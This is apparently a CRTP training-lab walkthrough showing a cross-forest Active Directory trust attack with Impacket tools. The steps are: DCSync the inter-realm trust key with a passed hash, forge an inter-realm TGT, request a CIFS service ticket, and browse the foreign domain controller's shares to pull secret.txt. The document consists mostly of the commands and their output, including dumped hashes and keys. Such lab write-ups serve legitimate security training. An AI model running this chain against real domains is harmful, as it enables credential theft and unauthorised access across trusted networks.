- Find the Inter-Realm Trust Key.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/dollarcorp.moneycorp.local]
└─# impacket-secretsdump dollarcorp.moneycorp.local/Administrator@172.16.2.1 -hashes :af0686cc0ca8f04df42210c9ac980760 -just-dc-user 'ecorp$' 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
ecorp$:1112:aad3b435b51404eeaad3b435b51404ee:652127203547e42b5b33a68fc49d8e8b:::
[*] Kerberos keys grabbed
ecorp$:aes256-cts-hmac-sha1-96:243d1829c0595b8908f2b5e9c3412f6d1ee85f55f1865d741d4e4e2184be29bf
ecorp$:aes128-cts-hmac-sha1-96:3d38d1848c732050b89b2dfce6be0b92
ecorp$:des-cbc-md5:3d917aa7cd2c3894
[*] Cleaning up...
```

- Forge an Inter-Realm TGT for fake user `interealm`.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/tickets]
└─# impacket-ticketer -nthash 652127203547e42b5b33a68fc49d8e8b -domain-sid S-1-5-21-719815819-3726368948-3917688648 -domain dollarcorp.moneycorp.local -spn krbtgt/eurocorp.local interealm
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for dollarcorp.moneycorp.local/interealm
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in interealm.ccache
```

- Import the TGT.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/tickets]
└─# export KRB5CCNAME=interealm.ccache
```

- Request a ST for `cifs/eurocorp-dc.eurocorp.local` as `interealm`.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/tickets]
└─# impacket-getST -k -no-pass -spn cifs/eurocorp-dc.eurocorp.local eurocorp.local/interealm@eurocorp.local                                                                                
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting ST for user
[*] Saving ticket in interealm@eurocorp.local.ccache
```

- Import the ST.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/tickets]
└─# export KRB5CCNAME=interealm@eurocorp.local.ccache
```

- Access the inter-realm shared resources.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/tickets]
└─# impacket-smbclient -k -no-pass interealm@eurocorp-dc.eurocorp.local                                    
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
SharedwithDCorp
SYSVOL
# use SharedwithDCorp
# ls
drw-rw-rw-          0  Wed Nov 16 14:26:36 2022 .
drw-rw-rw-          0  Tue Nov 15 16:17:43 2022 ..
-rw-rw-rw-         29  Wed Nov 16 14:26:36 2022 secret.txt
# get secret.txt
# back
*** Unknown syntax: back
# cd ../
# ls
drw-rw-rw-          0  Wed Nov 16 14:26:36 2022 .
drw-rw-rw-          0  Tue Nov 15 16:17:43 2022 ..
-rw-rw-rw-         29  Wed Nov 16 14:26:36 2022 secret.txt
# shares
ADMIN$
C$
IPC$
NETLOGON
SharedwithDCorp
SYSVOL
# use C$
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# 

```